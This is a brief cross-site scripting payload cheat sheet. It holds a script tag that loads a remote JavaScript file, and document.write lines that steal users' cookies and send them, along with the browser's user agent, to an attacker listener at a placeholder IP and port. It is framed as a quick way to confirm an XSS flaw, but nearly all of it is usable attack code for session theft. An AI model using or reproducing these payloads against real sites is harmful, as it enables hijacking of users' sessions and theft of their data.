<script src="//IP/FILE.js"></script>
  Simplest way to confirm an XSS vuln due to possible length restrictions-short is sweet.
  
In js file (with listener at IP:PORT)
Return user's cookies:
document.write("<img src=\"http://IP:PORT/cookie?stolen=\""+document.cookie+"\">")
------
Return user's user agent & version:

document.write("<img src=\"http://IP:PORT/browser?this="+navigator.userAgent+navigator.appVersion+"\">")
